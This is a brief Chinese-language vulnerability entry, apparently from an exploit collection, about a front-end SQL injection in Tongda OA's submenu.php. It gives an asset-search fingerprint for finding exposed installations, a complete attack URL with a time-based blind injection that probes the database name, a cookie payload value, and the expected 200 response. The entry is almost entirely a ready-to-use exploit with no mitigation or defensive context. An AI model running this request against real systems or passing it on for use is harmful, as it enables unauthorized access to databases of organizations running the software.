# 通达OA前台submenu.php存在SQL注入漏洞

通达OA ｜ SQL注入 ｜ —
- **指纹**：`app="TDXK-通达OA"`
- **请求**：`http://IP/pda/appcenter/submenu.php?appid=1%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)`

**Payload**
```
userid_flash=214eUQYFUgECBFQJVFcHCwADVlIOVAIDAgBUAlQJ
```
- **响应特征**：200